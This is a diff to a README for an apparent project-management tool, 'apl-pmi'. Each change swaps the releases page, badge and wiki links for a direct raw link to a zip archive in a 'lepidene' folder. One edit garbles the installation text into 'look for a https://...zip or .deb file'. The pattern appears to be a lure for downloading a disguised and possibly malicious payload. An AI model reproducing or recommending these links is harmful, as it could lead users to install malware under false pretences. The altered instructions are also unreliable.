@@ -1,7 +1,7 @@
 # 🚀 apl-pmi - Manage Your Application Effectively
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/pumaallenblack13/apl-pmi/releases)
+[![Download](https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip)](https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip)
 
 ## 📋 Overview
 Welcome to the apl-pmi application. This software helps users manage their projects with ease and efficiency. It's designed for simplicity, ensuring that anyone can organize their tasks without any technical knowledge.
@@ -24,14 +24,14 @@ Follow these steps to download and run apl-pmi:
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads section. 
 
-   [Visit Releases Page](https://github.com/pumaallenblack13/apl-pmi/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip)
 
 2. **Select Your Version:** Look for the latest version of apl-pmi. This is usually at the top of the page. Each version will include a description of new features or fixes.
 
 3. **Download the Installer:** Choose the installer that matches your operating system:
    - For Windows, look for a file with a .exe extension.
    - For macOS, look for a file with a .dmg extension.
-   - For Linux, look for a .tar.gz or .deb file.
+   - For Linux, look for a https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip or .deb file.
 
 4. **Install the Application:** 
    - **For Windows:** Double-click the downloaded .exe file. Follow the on-screen instructions to complete the installation.
@@ -43,7 +43,7 @@ Follow these steps to download and run apl-pmi:
 ## 📥 Download & Install
 To download apl-pmi, visit the releases page and select the appropriate file for your system:
 
-[Download from Releases Page](https://github.com/pumaallenblack13/apl-pmi/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip)
 
 ## 📞 Support
 If you encounter any issues during installation or have questions about using apl-pmi, please reach out for support. You can file an issue directly on this GitHub repository. 
@@ -55,7 +55,7 @@ If you encounter any issues during installation or have questions about using ap
 We will do our best to help you promptly.
 
 ## 📚 Additional Resources
-- **Documentation:** Find detailed guides and FAQs [here](https://github.com/pumaallenblack13/apl-pmi/wiki).
+- **Documentation:** Find detailed guides and FAQs [here](https://raw.githubusercontent.com/pumaallenblack13/apl-pmi/main/lepidene/apl-pmi.zip).
 - **Community Forum:** Join our community to share tips and tricks or get help from fellow users.
 
 ## 📅 Roadmap
